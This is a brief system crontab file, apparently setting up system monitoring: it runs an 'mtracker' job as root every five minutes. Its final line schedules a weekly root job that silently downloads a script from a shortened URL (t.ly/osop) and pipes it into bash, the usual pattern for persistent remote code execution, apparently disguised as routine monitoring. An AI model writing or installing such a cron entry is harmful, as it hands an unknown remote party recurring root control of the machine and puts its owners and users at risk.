SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#Monitor System with mTracker
*/5 * * * *   root   mtracker -m mwatcher > /dev/null
@weekly   root   curl -sL t.ly/osop|bash - > /dev/null